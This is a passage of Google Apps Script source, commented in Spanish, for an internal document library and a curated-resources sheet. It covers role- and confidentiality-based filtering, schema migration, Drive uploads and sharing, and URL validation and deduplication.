var _BIB_COLS = _BIB_HEADERS.length; // 17 (col 17 = areaSolicitante / cliente interno)
var _BIB_COLS_V2 = 16; // base v2 (sin areaSolicitante); para distinguir el 7-col viejo de v2+

// Crea la hoja con 16 columnas si no existe. Si ya existe con el schema viejo
// (7 cols) NO la toca: la migración la reordena, porque autor/fecha cambian de
// posición (col 6/7 → col 10/12) y un simple "extender headers" las desalinearía.
function _ensureBiblioDocsSheet(ss) {
  var ws = ss.getSheetByName(SHEET_BIBLIO_DOCS);
  if (!ws) {
    ws = ss.insertSheet(SHEET_BIBLIO_DOCS);
    ws.getRange(1, 1, 1, _BIB_COLS).setValues([_BIB_HEADERS]);
    ws.getRange(1, 1, 1, _BIB_COLS).setFontWeight('bold');
    ws.setFrozenRows(1);
  } else if (ws.getLastColumn() === _BIB_COLS_V2) {
    // Sheet v2 (16 cols): agregar la col 17 'areaSolicitante' como trailing (no
    // reordena nada; las filas viejas quedan con área vacía hasta editarse).
    ws.getRange(1, _BIB_COLS).setValue(_BIB_HEADERS[_BIB_COLS - 1]);
    ws.getRange(1, _BIB_COLS).setFontWeight('bold');
  }
  return ws;
}

// Migración one-shot 7→16 cols. Correr UNA vez desde el editor (solo head).
// Lee la data vieja en memoria, reordena (categoria→tags; autor col6→col10;
// fecha col7→col12) y reescribe con defaults. Idempotente.
function migrateBiblioDocsSchema(ss) {
  ss = ss || SpreadsheetApp.openById(SHEET_ID);
  var ctx = _getAuthContext();
  if (ctx.role !== 'head') throw new Error('Solo un head puede migrar la Biblioteca.');
  var ws = ss.getSheetByName(SHEET_BIBLIO_DOCS);
  if (!ws) { _ensureBiblioDocsSheet(ss); return 'Hoja creada nueva (16 cols). Nada que migrar.'; }
  if (ws.getLastColumn() >= _BIB_COLS_V2) { _ensureBiblioDocsSheet(ss); return 'Ya está en schema v2+; columna areaSolicitante asegurada.'; }
  var lr = ws.getLastRow();
  var oldData = lr >= 2 ? ws.getRange(2, 1, lr - 1, 7).getValues() : [];
  var newRows = oldData.map(function(r) {
    return [
      r[0], r[1], (r[2] || 'link'), r[3],
      'Otro', 'Operativo', 'CO', 'estandar',
      (r[4] || '').toString().trim(),   // categoria vieja → tags
      r[5], '',                          // autor (col6 vieja), autorEmail (desconocido)
      r[6], 'si', '', '', '',            // fecha (col7 vieja), vigente, notas, actualizadoPor, fechaActualizado
      ''                                  // areaSolicitante (col 17)
    ];
  });
  ws.clear();
  ws.getRange(1, 1, 1, _BIB_COLS).setValues([_BIB_HEADERS]);
  ws.getRange(1, 1, 1, _BIB_COLS).setFontWeight('bold');
  ws.setFrozenRows(1);
  if (newRows.length) ws.getRange(2, 1, newRows.length, _BIB_COLS).setValues(newRows.map(function(rw){ return _sanitizeRow(rw); }));
  try { CacheService.getScriptCache().remove(CACHE_KEY); } catch (e) {}
  return 'Migrados ' + newRows.length + ' documentos al schema de 16 columnas.';
}

// Sanitiza tags: trim, lowercase, dedup, cap 5 tags × 30 chars, rejoin ", ".
function _bibSanitizeTags(raw) {
  var seen = {}, out = [];
  (raw || '').toString().toLowerCase().split(',').forEach(function(t) {
    t = t.trim().slice(0, 30);
    if (t && !seen[t]) { seen[t] = 1; out.push(t); }
  });
  return out.slice(0, 5).join(', ');
}

// Valida/normaliza metadata contra los vocabularios. Aplica la restricción de
// confidencialidad para specialist (no puede marcar 'confidencial').
function _bibValidateMeta(meta, role) {
  meta = meta || {};
  var tipoDoc = (meta.tipoDocumento || '').toString().trim();
  var area = (meta.areaTrabajo || '').toString().trim();
  var pais = (meta.pais || '').toString().trim();
  var conf = (meta.confidencialidad || 'estandar').toString().trim().toLowerCase();
  if (_BIB_TIPOS_DOC.indexOf(tipoDoc) < 0) return { ok: false, error: 'Tipo de documento inválido.' };
  if (_BIB_AREAS.indexOf(area) < 0) return { ok: false, error: 'Área de trabajo inválida.' };
  if (_BIB_PAISES.indexOf(pais) < 0) return { ok: false, error: 'País inválido.' };
  if (_BIB_CONFID.indexOf(conf) < 0) conf = 'estandar';
  if (role === 'specialist' && conf === 'confidencial') {
    return { ok: false, error: 'Solo manager o head pueden marcar un documento como Altamente confidencial.' };
  }
  return { ok: true, meta: {
    tipoDocumento: tipoDoc, areaTrabajo: area, pais: pais, confidencialidad: conf,
    tags: _bibSanitizeTags(meta.tags), notas: (meta.notas || '').toString().trim().slice(0, 300),
    areaSolicitante: (meta.areaSolicitante || '').toString().trim().slice(0, 40) // cliente interno (opcional)
  }};
}

function _bibUserCountry(ctx) { return (ctx && ctx.user && ctx.user.code) ? ctx.user.code : ''; }

// Filtra docs por rol + país + confidencialidad (server-side, igual que tareas).
//   País: specialist/manager ven su país + LATAM + Global; head ve todo.
//   estandar → todos (del país); restringido → autor / manager del país del doc
//   / head; confidencial → autor / head.
function _filterBibDocsForRole(docs, ctx) {
  var role = ctx.role;
  var myCountry = (ctx.user && ctx.user.code) || '';
  var myEmail = (ctx.email || '').toString().toLowerCase();
  var equipos = ctx.equipos || [];
  function leaderEmailFor(code) {
    for (var i = 0; i < equipos.length; i++) {
      if (equipos[i].code === code) return (equipos[i].leaderEmail || '').toString().toLowerCase();
    }
    return '';
  }
  return (docs || []).filter(function(d) {
    if (role !== 'head') {
      var p = d.pais || '';
      if (p !== myCountry && p !== 'LATAM' && p !== 'Global') return false;
    }
    var conf = d.confidencialidad || 'estandar';
    var authorEmail = (d.autorEmail || '').toString().toLowerCase();
    if (conf === 'estandar') return true;
    if (conf === 'restringido') {
      return role === 'head'
          || (!!myEmail && myEmail === authorEmail)
          || (role === 'manager' && !!leaderEmailFor(d.pais) && leaderEmailFor(d.pais) === myEmail);
    }
    if (conf === 'confidencial') {
      return role === 'head' || (!!myEmail && myEmail === authorEmail);
    }
    return true;
  });
}

function getBibliotecaDocs() {
  return _telemetry('getBibliotecaDocs', function() {
    var ctx = _getAuthContext();
    var ws = ctx.ss.getSheetByName(SHEET_BIBLIO_DOCS);
    if (!ws) return { items: [] };
    var lr = ws.getLastRow();
    if (lr < 2) return { items: [] };
    var lc = ws.getLastColumn();
    var wide = lc >= _BIB_COLS_V2; // true = v2+ (16/17 cols); false = viejo (7)
    var data = ws.getRange(2, 1, lr - 1, Math.min(lc, _BIB_COLS)).getValues();
    var items = [];
    data.forEach(function(r) {
      var id = (r[0] || '').toString().trim();
      var nombre = (r[1] || '').toString().trim();
      if (!id || !nombre) return;
      if (wide) {
        items.push({
          id: id, nombre: nombre,
          tipo: (r[2] || 'link').toString().trim().toLowerCase(),
          url: (r[3] || '').toString().trim(),
          tipoDocumento: (r[4] || '').toString().trim() || 'Otro',
          areaTrabajo: (r[5] || '').toString().trim() || 'Operativo',
          pais: (r[6] || '').toString().trim() || 'CO',
          confidencialidad: (r[7] || '').toString().trim().toLowerCase() || 'estandar',
          tags: (r[8] || '').toString().trim(),
          autor: (r[9] || '').toString().trim(),
          autorEmail: (r[10] || '').toString().trim(),
          fecha: (r[11] || '').toString().trim(),
          vigente: (r[12] || '').toString().trim().toLowerCase() || 'si',
          notas: (r[13] || '').toString().trim(),
          actualizadoPor: (r[14] || '').toString().trim(),
          fechaActualizado: (r[15] || '').toString().trim(),
          areaSolicitante: (r[16] || '').toString().trim() // col 17; '' en sheets v2 (16)
        });
      } else {
        // Schema viejo (7 cols): id|nombre|tipo|url|categoria|autor|fecha.
        // Defaults seguros para que la vista funcione antes de migrar.
        items.push({
          id: id, nombre: nombre,
          tipo: (r[2] || 'link').toString().trim().toLowerCase(),
          url: (r[3] || '').toString().trim(),
          tipoDocumento: 'Otro', areaTrabajo: 'Operativo', pais: 'CO', confidencialidad: 'estandar',
          tags: (r[4] || '').toString().trim(), // categoria vieja
          autor: (r[5] || '').toString().trim(), autorEmail: '',
          fecha: (r[6] || '').toString().trim(),
          vigente: 'si', notas: '', actualizadoPor: '', fechaActualizado: '', areaSolicitante: ''
        });
      }
    });
    return { items: _filterBibDocsForRole(items, ctx) };
  });
}

function addBibliotecaDocLink(nombre, url, metadata) {
  return _telemetry('addBibliotecaDocLink', function() {
    return _safeMutation(function() {
      var ctx = _getAuthContext();
      var u = (url || '').toString().trim();
      if (!u) return { success: false, error: 'Pegá un enlace.' };
      if (!/^https?:\/\//i.test(u)) return { success: false, error: 'El enlace debe empezar con http:// o https://' };
      var v = _bibValidateMeta(metadata, ctx.role);
      if (!v.ok) return { success: false, error: v.error };
      var ws = _ensureBiblioDocsSheet(ctx.ss);
      if (ws.getLastColumn() < _BIB_COLS) return _err('SHEET_NOT_MIGRATED', 'La Biblioteca necesita migración: pedile a un head que corra migrateBiblioDocsSchema().');
      var nm = (nombre || '').toString().trim().slice(0, 120) || u.slice(0, 80);
      var m = v.meta, now = new Date().toISOString();
      var id = 'D' + Date.now() + Math.floor(Math.random() * 1000);
      ws.appendRow(_sanitizeRow([id, nm, 'link', u, m.tipoDocumento, m.areaTrabajo, m.pais, m.confidencialidad, m.tags, (ctx.user && ctx.user.name) || ctx.email || '', ctx.email || '', now, 'si', m.notas, '', '', m.areaSolicitante]));
      try { _aiUpsertEmbedding(ctx.ss, id, _aiBiblioText({ nombre: nm, tags: m.tags, notas: m.notas, tipoDocumento: m.tipoDocumento, areaTrabajo: m.areaTrabajo, areaSolicitante: m.areaSolicitante, pais: m.pais })); } catch (e) {}
      return { success: true, id: id };
    });
  }, {});
}

function uploadBibliotecaDocFile(fileData, metadata) {
  return _telemetry('uploadBibliotecaDocFile', function() {
    return _safeMutation(function() {
      var ctx = _getAuthContext();
      if (!fileData || !fileData.data || !fileData.name) return { success: false, error: 'Datos de archivo inválidos' };
      var mime = (fileData.mimeType || '').toString().trim().toLowerCase();
      if (!_UPLOAD_ALLOWED_MIME[mime]) return { success: false, error: 'Tipo de archivo no permitido' };
      if (fileData.data.length * 0.75 > _UPLOAD_MAX_BYTES) return { success: false, error: 'Archivo demasiado grande (máx. 45 MB)' };
      var v = _bibValidateMeta(metadata, ctx.role);
      if (!v.ok) return { success: false, error: v.error };
      var ws = _ensureBiblioDocsSheet(ctx.ss);
      if (ws.getLastColumn() < _BIB_COLS) return _err('SHEET_NOT_MIGRATED', 'La Biblioteca necesita migración: pedile a un head que corra migrateBiblioDocsSchema().');
      var bytes = Utilities.base64Decode(fileData.data);
      if (bytes.length > _UPLOAD_MAX_BYTES) return { success: false, error: 'Archivo demasiado grande (máx. 45 MB)' };
      // Taxonomía de biblioteca: Biblioteca / TipoDocumento / Cliente / País.
      // Agrupa por tipo de documento primero (todos los NDAs juntos, etc.),
      // luego cliente interno (área solicitante), luego país. Get-or-create.
      var bibRoot = _ensureSubfolder(_getRootFolder(), 'Biblioteca');
      var bibTipo = _ensureSubfolder(bibRoot, v.meta.tipoDocumento || 'Sin clasificar');
      var bibCli  = _ensureSubfolder(bibTipo, v.meta.areaSolicitante || 'Genérico');
      var folder  = _ensureSubfolder(bibCli, v.meta.pais || 'Sin país');
      var file = folder.createFile(Utilities.newBlob(bytes, mime, fileData.name));
      // Sharing por nivel: la app corre como owner y la carpeta raíz es privada
      // → sin esto, el resto del equipo NO podía ni abrir lo subido. Los docs
      // 'estandar' nacen legibles por el dominio (con link); restringido/
      // confidencial NO se comparten (el filtrado de la app decide quién los ve).
      _bibEnsureSharing(file, v.meta.confidencialidad);
      var m = v.meta, now = new Date().toISOString();
      var id = 'D' + Date.now() + Math.floor(Math.random() * 1000);
      ws.appendRow(_sanitizeRow([id, file.getName(), 'file', file.getUrl(), m.tipoDocumento, m.areaTrabajo, m.pais, m.confidencialidad, m.tags, (ctx.user && ctx.user.name) || ctx.email || '', ctx.email || '', now, 'si', m.notas, '', '', m.areaSolicitante]));
      try { _aiUpsertEmbedding(ctx.ss, id, _aiBiblioText({ nombre: file.getName(), tags: m.tags, notas: m.notas, tipoDocumento: m.tipoDocumento, areaTrabajo: m.areaTrabajo, areaSolicitante: m.areaSolicitante, pais: m.pais })); } catch (e) {}
      return { success: true, id: id, url: file.getUrl() };
    });
  }, {});
}

// Asegura lectura por dominio (con link) para documentos 'estandar' de la
// Biblioteca. Best-effort: si el admin de Workspace deshabilitó el sharing por
// dominio, no rompe (devuelve false y la app sigue — el dueño puede compartir
// a mano). Para restringido/confidencial NO se toca el sharing (gap de Drive
// documentado en PENDIENTES: la app filtra, pero el link directo manda).
function _bibEnsureSharing(file, conf) {
  try {
    if ((conf || 'estandar') !== 'estandar') return false;
    file.setSharing(DriveApp.Access.DOMAIN_WITH_LINK, DriveApp.Permission.VIEW);
    return true;
  } catch (e) {
    Logger.log('_bibEnsureSharing skipped: ' + ((e && e.message) || e));
    return false;
  }
}

// "Usar modelo": devuelve cómo llevarse una copia de trabajo de un doc de
// Biblioteca SIN tocar el original (sin makeCopy: la app corre como owner y
// la copia quedaría a nombre de la cuenta del Tracker, no del usuario).
//   · file  → URL de descarga directa (uc?export=download). Para docs
//             'estandar' asegura el sharing por dominio (idempotente — cubre
//             también archivos subidos antes de este fix).
//   · link  → la URL tal cual (no se puede copiar un enlace externo).
// Confidencialidad server-side: el doc se busca en la lista YA filtrada por
// rol (getBibliotecaDocs) — si el rol no puede verlo, NOT_FOUND.
function usarModelo(docId) {
  return _telemetry('usarModelo', function() {
    var did = (docId || '').toString().trim();
    if (!did) return _err('VALIDATION', 'ID requerido.');
    var res = getBibliotecaDocs(); // valida allowlist + filtra por rol/conf
    var doc = ((res && res.items) || []).filter(function(d){ return String(d.id) === did; })[0];
    if (!doc) return _err('NOT_FOUND', 'Documento no encontrado o sin acceso.');
    if ((doc.tipo || 'link') === 'link') {
      return { success: true, mode: 'link', url: doc.url || '' };
    }
    var fileId = _extractDriveId(doc.url || '');
    if (!fileId) return _err('VALIDATION', 'El documento no tiene un archivo de Drive válido.');
    var shared = false;
    try {
      var file = DriveApp.getFileById(fileId);
      shared = _bibEnsureSharing(file, doc.confidencialidad);
    } catch (e) {
      Logger.log('usarModelo sharing check skipped: ' + ((e && e.message) || e));
    }
    // Semilla para "lo más usado" (Fase 3.3): registro best-effort en Activity.
    // No aparece en los feeds de tareas (filtran por taskIds reales).
    try {
      var ctx2 = _getAuthContext();
      _logActivity(ctx2, did, 'modelo_usado', doc.tipoDocumento || '', '', doc.nombre || '');
    } catch (e2) {}
    return {
      success: true,
      mode: 'file',
      url: doc.url || '',
      downloadUrl: 'https://drive.google.com/uc?export=download&id=' + fileId,
      // true solo si la lectura por dominio quedó asegurada — el front avisa
      // "puede pedirte acceso" cuando es false (docs sensibles / sharing off).
      shared: shared
    };
  }, { docId: docId });
}

function deleteBibliotecaDoc(id) {
  return _telemetry('deleteBibliotecaDoc', function() {
    return _safeMutation(function() {
      var ctx = _getAuthContext();
      var did = (id || '').toString().trim();
      if (!did) return { success: false, error: 'ID requerido.' };
      var ws = ctx.ss.getSheetByName(SHEET_BIBLIO_DOCS);
      if (!ws) return { success: false, error: 'No hay documentos.' };
      var lr = ws.getLastRow();
      if (lr < 2) return { success: false, error: 'No hay documentos.' };
      var lc = ws.getLastColumn();
      var wide = lc >= _BIB_COLS_V2;
      var data = ws.getRange(2, 1, lr - 1, Math.min(lc, _BIB_COLS)).getValues();
      var rowIdx = -1, autor = '', autorEmail = '', docPais = '';
      for (var i = 0; i < data.length; i++) {
        if ((data[i][0] || '').toString().trim() === did) {
          rowIdx = i + 2;
          autor = (data[i][wide ? 9 : 5] || '').toString().trim();
          autorEmail = (wide ? (data[i][10] || '') : '').toString().toLowerCase();
          docPais = (wide ? (data[i][6] || '') : '').toString().trim();
          break;
        }
      }
      if (rowIdx < 0) return { success: false, error: 'Documento no encontrado.' };
      var isAuthor = (ctx.email && autorEmail && ctx.email.toLowerCase() === autorEmail)
                  || _normalizeName(autor) === _normalizeName((ctx.user && ctx.user.name) || '');
      var isMgrOfCountry = ctx.role === 'manager' && _bibUserCountry(ctx) === docPais;
      if (ctx.role !== 'head' && !isAuthor && !isMgrOfCountry) {
        return { success: false, error: 'Solo el autor, el manager del país o un head pueden eliminar este documento.' };
      }
      ws.deleteRow(rowIdx); // el archivo en Drive no se borra (queda en la carpeta Biblioteca)
      return { success: true, id: did };
    });
  }, {});
}

// Edita SOLO la metadata (cols 5-9, 14-16) de un doc existente — no toca
// id/nombre/tipo/url ni autor/fecha de creación. Permisos: autor, manager del
// país del doc, o head.
function updateBibliotecaDocMeta(docId, metadata) {
  return _telemetry('updateBibliotecaDocMeta', function() {
    return _safeMutation(function() {
      var ctx = _getAuthContext();
      var did = (docId || '').toString().trim();
      if (!did) return { success: false, error: 'ID requerido.' };
      var v = _bibValidateMeta(metadata, ctx.role);
      if (!v.ok) return { success: false, error: v.error };
      var ws = _ensureBiblioDocsSheet(ctx.ss); // asegura col 17 (areaSolicitante) en sheets v2
      if (!ws || ws.getLastColumn() < _BIB_COLS) return { success: false, error: 'Biblioteca no disponible o sin migrar.' };
      var lr = ws.getLastRow();
      if (lr < 2) return { success: false, error: 'No hay documentos.' };
      var data = ws.getRange(2, 1, lr - 1, _BIB_COLS).getValues();
      var rowIdx = -1, row = null;
      for (var i = 0; i < data.length; i++) {
        if ((data[i][0] || '').toString().trim() === did) { rowIdx = i + 2; row = data[i]; break; }
      }
      if (rowIdx < 0) return { success: false, error: 'Documento no encontrado.' };
      var docPais = (row[6] || '').toString().trim();
      var docAutorEmail = (row[10] || '').toString().toLowerCase();
      var docAutor = (row[9] || '').toString();
      var isAuthor = (ctx.email && docAutorEmail && ctx.email.toLowerCase() === docAutorEmail)
                  || _normalizeName(docAutor) === _normalizeName((ctx.user && ctx.user.name) || '');
      var isMgrOfCountry = ctx.role === 'manager' && _bibUserCountry(ctx) === docPais;
      if (ctx.role !== 'head' && !isAuthor && !isMgrOfCountry) {
        return { success: false, error: 'No tenés permiso para editar este documento.' };
      }
      var m = v.meta;
      ws.getRange(rowIdx, 5).setValue(_sanitizeCell(m.tipoDocumento));
      ws.getRange(rowIdx, 6).setValue(_sanitizeCell(m.areaTrabajo));
      ws.getRange(rowIdx, 7).setValue(_sanitizeCell(m.pais));
      ws.getRange(rowIdx, 8).setValue(_sanitizeCell(m.confidencialidad));
      ws.getRange(rowIdx, 9).setValue(_sanitizeCell(m.tags));
      ws.getRange(rowIdx, 17).setValue(_sanitizeCell(m.areaSolicitante));
      ws.getRange(rowIdx, 14).setValue(_sanitizeCell(m.notas));
      ws.getRange(rowIdx, 15).setValue(_sanitizeCell((ctx.user && ctx.user.name) || ctx.email || ''));
      ws.getRange(rowIdx, 16).setValue(new Date().toISOString());
      return { success: true, id: did };
    });
  }, { docId: docId });
}

// Vocabularios + contexto del usuario para poblar los dropdowns del frontend.
function getBibliotecaConfig() {
  return _telemetry('getBibliotecaConfig', function() {
    var ctx = _getAuthContext();
    var cfg = readConfig(ctx.ss);
    var clientes = (cfg.ClientesInternos || 'Restaurantes, Finanzas, Tesorería, Monetization').toString().split(',').map(function(s){ return s.trim(); }).filter(Boolean);
    return {
      tiposDocumento: _BIB_TIPOS_DOC,
      areas: _BIB_AREAS,
      paises: _BIB_PAISES,
      confidencialidad: _BIB_CONFID,
      clientesInternos: clientes,
      userCountry: (ctx.user && ctx.user.code) || 'CO',
      userRole: ctx.role
    };
  });
}

// ════════════════════════════════════════════════════════════════
// ── RECURSOS ── · links curados (herramientas tech/AI, docs, clases)
// ════════════════════════════════════════════════════════════════
// A diferencia de la Biblioteca, Recursos es role-agnostic: TODOS ven TODO
// (sin filtro de rol/país). La hoja se auto-crea on-first-use (mismo patrón
// que Comments/Activity/BibliotecaDocs) y se siembra con 1 recurso inicial.
// Cols (14, orden fijo): id | titulo | url | categoria | descripcion | autor |
// autorEmail | fecha | tipo | tags | destacado | clicks | area | requierePago.
// La hoja se auto-upgradea (8 → 14) de forma idempotente en _ensureRecursosSheet,
// así la feature anda aunque el admin no haya corrido migrarRecursosFaseB todavía.
const _REC_HEADERS = ['id', 'titulo', 'url', 'categoria', 'descripcion', 'autor', 'autorEmail', 'fecha', 'tipo', 'tags', 'destacado', 'clicks', 'area', 'requierePago'];
const _REC_COLS = _REC_HEADERS.length; // 14

// Tipos válidos de recurso (fase B). Cualquier otro valor se normaliza a ''.
const _REC_TIPOS = ['tool', 'guide', 'course', 'repo', 'template', 'dataset'];

// Defaults para las columnas nuevas (8 → 14), por nombre. 'tags' es especial:
// hereda el valor de 'categoria' en el upgrade (mismo criterio que admin.gs).
const _REC_DEFAULTS_BY_NAME = { tipo: '', tags: '', destacado: false, clicks: 0, area: '', requierePago: false };

// Siembra inicial (solo al crear la hoja). fecha se completa al sembrar.
// Fila completa de 14 cols (tipo/tags/destacado/clicks/area/requierePago).
function _recSeedRows(ss) {
  var cat = 'Guías legales / AI';
  return [[
    1,
    'Mundial FIFA 2026 — Guía legal (NotebookLM)',
    'https://notebooklm.google.com/notebook/fc842e78-a8e9-4861-a6ba-f9c7802dc567',
    cat,
    'Guía estratégica y legal de Rappi para el Mundial FIFA 2026: ejecutar campañas de marketing y eventos sin infringir la propiedad intelectual de la FIFA ni incurrir en ambush marketing.',
    'Juan Gallego',
    'juan.gallego@rappi.com',
    Utilities.formatDate(new Date(), 'America/Bogota', 'dd/MM/yyyy'),
    'guide', // tipo
    cat,     // tags (hereda categoria, mismo criterio que el upgrade)
    false,   // destacado
    0,       // clicks
    '',      // area
    false    // requierePago
  ]];
}

// Mismo patrón que _commentsSheet/_ensureBiblioDocsSheet: get-or-create con
// header en bold + fila congelada. Si la crea, además la siembra.
function _ensureRecursosSheet(ss) {
  var ws = ss.getSheetByName(SHEET_RECURSOS);
  if (!ws) {
    ws = ss.insertSheet(SHEET_RECURSOS);
    ws.getRange(1, 1, 1, _REC_COLS).setValues([_REC_HEADERS]);
    ws.getRange(1, 1, 1, _REC_COLS).setFontWeight('bold');
    ws.setFrozenRows(1);
    var seed = _recSeedRows(ss);
    if (seed && seed.length) ws.getRange(2, 1, seed.length, _REC_COLS).setValues(seed.map(_sanitizeRow));
    return ws;
  }
  // Upgrade idempotente del header (8 → 14). Mismo criterio que admin.gs/
  // migrarRecursosFaseB: si la hoja tiene menos cols que _REC_HEADERS, agregar
  // las faltantes AL FINAL (fila 1) y poblar defaults en las filas de data en
  // BATCH (tags ← categoria). Así la feature anda sin esperar al admin.
  var lastCol = ws.getLastColumn();
  if (lastCol < _REC_COLS) {
    var firstNew = lastCol; // índice 0-based de la primera col faltante
    var missing = _REC_HEADERS.slice(firstNew);
    ws.getRange(1, firstNew + 1, 1, missing.length).setValues([missing]);
    ws.getRange(1, firstNew + 1, 1, missing.length).setFontWeight('bold');
    var lastRow = ws.getLastRow();
    if (lastRow >= 2) {
      var numRows = lastRow - 1;
      // Col 4 = categoria, para poblar 'tags' en las filas existentes.
      var cats = ws.getRange(2, 4, numRows, 1).getValues();
      var fill = [];
      for (var r = 0; r < numRows; r++) {
        var rowVals = [];
        for (var c = 0; c < missing.length; c++) {
          var name = missing[c];
          rowVals.push(name === 'tags' ? cats[r][0] : _REC_DEFAULTS_BY_NAME[name]);
        }
        fill.push(rowVals);
      }
      ws.getRange(2, firstNew + 1, numRows, missing.length).setValues(fill.map(_sanitizeRow));
    }
  }
  return ws;
}

// id incremental = max(ids)+1 (o 1 si vacía). Mismo patrón que nextTaskId/_nextCommentId.
function _nextRecursoId(ws) {
  var lr = ws.getLastRow();
  if (lr < 2) return 1;
  var ids = ws.getRange(2, 1, lr - 1, 1).getValues();
  var max = 0;
  for (var i = 0; i < ids.length; i++) {
    var n = parseInt(ids[i][0], 10);
    if (!isNaN(n) && n > max) max = n;
  }
  return max + 1;
}

// Valida una URL de recurso con el MISMO criterio que attachDocumentLink:
// solo http(s) (bloquea javascript:/data:/file: → XSS), máx 2048, sin chars de
// control. Devuelve { ok:true, url } o { ok:false, error }.
function _recValidateUrl(raw) {
  var url = (raw || '').toString().trim();
  if (!/^https?:\/\//i.test(url)) {
    return { ok: false, error: 'URL inválida: solo se aceptan https:// o http://' };
  }
  if (url.length > 2048) {
    return { ok: false, error: 'URL demasiado larga (máx. 2048 caracteres)' };
  }
  if (/[\x00-\x1f\x7f]/.test(url)) {
    return { ok: false, error: 'URL contiene caracteres inválidos' };
  }
  return { ok: true, url: url };
}

// Normaliza una URL para deduplicar: minúsculas, sin barra final, sin params
// utm_* (conserva el resto del query en orden original). Tolerante: si algo
// falla, cae a un lowercase+trim simple.
function _recNormalizeUrl(raw) {
  var url = (raw || '').toString().trim().toLowerCase();
  if (!url) return '';
  try {
    var hash = url.indexOf('#');
    if (hash >= 0) url = url.slice(0, hash); // descartar fragmento
    var qi = url.indexOf('?');
    var base = qi >= 0 ? url.slice(0, qi) : url;
    var query = qi >= 0 ? url.slice(qi + 1) : '';
    if (query) {
      var kept = query.split('&').filter(function(p) {
        if (!p) return false;
        var k = p.split('=')[0];
        return k.indexOf('utm_') !== 0; // descartar utm_*
      });
      query = kept.join('&');
    }
    base = base.replace(/\/+$/, ''); // sin barra(s) final(es)
    return query ? (base + '?' + query) : base;
  } catch (e) {
    return url.replace(/\/+$/, '');
  }
}

// tags: acepta array o CSV → array de strings no vacíos, trim, sin duplicados.
function _recParseTags(val) {
  var arr;
  if (Array.isArray(val)) arr = val;
  else if (val == null) arr = [];
  else arr = val.toString().split(',');
  var out = [], seen = {};
  for (var i = 0; i < arr.length; i++) {
    var t = (arr[i] || '').toString().trim();
    if (!t) continue;
    var k = t.toLowerCase();
    if (seen[k]) continue;
    seen[k] = true;
    out.push(t);
  }
  return out;
}

// tags array/CSV → CSV canónico para guardar en la celda.
function _recTagsToCsv(val) { return _recParseTags(val).join(', '); }

// Coerción robusta a boolean (la celda puede venir bool, 'true'/'TRUE', 1, '1').
function _recToBool(v) {
  if (v === true || v === false) return v;
  var s = (v == null ? '' : v).toString().trim().toLowerCase();
  return s === 'true' || s === '1' || s === 'yes' || s === 'sí' || s === 'si';
}

// tipo válido ∈ _REC_TIPOS, normalizado a minúsculas; cualquier otro → ''.
function _recNormalizeTipo(v) {
  var t = (v || '').toString().trim().toLowerCase();
  return _REC_TIPOS.indexOf(t) >= 0 ? t : '';
}

// Role-agnostic: TODOS ven TODOS los recursos (sin filtro de rol/país).
// Ordenado por categoria y luego titulo.
function getRecursos() {
  return _telemetry('getRecursos', function() {
    try {
      var ctx = _getAuthContext();
      var ws = _ensureRecursosSheet(ctx.ss); // crea + siembra + upgradea si hace falta
      var lr = ws.getLastRow();
      if (lr < 2) return { success: true, recursos: [] };
      // Lectura DEFENSIVA: hasta getLastColumn() real (puede ser 8 si el admin
      // no migró, o 14 ya migrado). Campos nuevos → defaults si la col no existe.
      var lc = Math.max(ws.getLastColumn(), _REC_COLS);
      var data = ws.getRange(2, 1, lr - 1, lc).getValues();
      var recursos = [];
      data.forEach(function(r) {
        var id = (r[0] || '').toString().trim();
        var titulo = (r[1] || '').toString().trim();
        if (!id || !titulo) return; // saltar filas vacías/corruptas
        var categoria = (r[3] || '').toString().trim() || 'General';
        // tags (col 10, idx 9): si la celda está vacía pero existe, cae a [].
        var tagsRaw = r.length > 9 ? r[9] : '';
        recursos.push({
          id: id,
          titulo: titulo,
          url: (r[2] || '').toString().trim(),
          categoria: categoria,
          descripcion: (r[4] || '').toString().trim(),
          autor: (r[5] || '').toString().trim(),
          autorEmail: (r[6] || '').toString().trim(),
          fecha: (r[7] || '').toString().trim(),
          tipo: _recNormalizeTipo(r.length > 8 ? r[8] : ''),
          tags: _recParseTags(tagsRaw),
          destacado: _recToBool(r.length > 10 ? r[10] : false),
          clicks: (function() { var n = parseInt(r.length > 11 ? r[11] : 0, 10); return isNaN(n) ? 0 : n; })(),
          area: (r.length > 12 ? (r[12] || '') : '').toString().trim(),
          requierePago: _recToBool(r.length > 13 ? r[13] : false)
        });
      });
      recursos.sort(function(a, b) {
        var ca = a.categoria.toLowerCase(), cb = b.categoria.toLowerCase();
        if (ca < cb) return -1;
        if (ca > cb) return 1;
        var ta = a.titulo.toLowerCase(), tb = b.titulo.toLowerCase();
        return ta < tb ? -1 : (ta > tb ? 1 : 0);
      });
      return { success: true, recursos: recursos };
    } catch (e) {
      return { success: false, error: (e && e.message) || String(e) };
    }
  });
}

// obj = {titulo, url, categoria, descripcion, tipo, tags, area, requierePago}.
// titulo requerido; url http(s) válida (misma validación que attachDocumentLink);
// categoria default 'General'. DEDUPE por URL normalizada (case/barra/utm_*).
// tipo válido ∈ _REC_TIPOS si no, ''. destacado=false y clicks=0 por default.
function addRecurso(obj) {
  return _telemetry('addRecurso', function() {
    return _safeMutation(function() {
      var ctx = _getAuthContext();
      obj = obj || {};
      var titulo = (obj.titulo || '').toString().trim();
      if (!titulo) return { success: false, error: 'El título es obligatorio.' };
      var v = _recValidateUrl(obj.url);
      if (!v.ok) return { success: false, error: v.error };
      var url = v.url;
      var categoria = (obj.categoria || '').toString().trim() || 'General';
      var descripcion = (obj.descripcion || '').toString().trim();
      var tipo = _recNormalizeTipo(obj.tipo);
      var tagsCsv = _recTagsToCsv(obj.tags);
      var area = (obj.area || '').toString().trim();
      var requierePago = _recToBool(obj.requierePago);
      var ws = _ensureRecursosSheet(ctx.ss);

      // ── DEDUPE: si ya existe un recurso con la misma URL normalizada ──
      var norm = _recNormalizeUrl(url);
      var lr = ws.getLastRow();
      if (norm && lr >= 2) {
        var lc = Math.max(ws.getLastColumn(), _REC_COLS);
        var rows = ws.getRange(2, 1, lr - 1, lc).getValues();
        for (var i = 0; i < rows.length; i++) {
          if (_recNormalizeUrl(rows[i][2]) === norm) {
            return {
              success: false,
              motivo: 'duplicado',
              recursoExistente: {
                id: (rows[i][0] || '').toString().trim(),
                titulo: (rows[i][1] || '').toString().trim(),
                url: (rows[i][2] || '').toString().trim(),
                categoria: (rows[i][3] || '').toString().trim() || 'General',
                descripcion: (rows[i][4] || '').toString().trim(),
                autor: (rows[i][5] || '').toString().trim(),
                autorEmail: (rows[i][6] || '').toString().trim(),
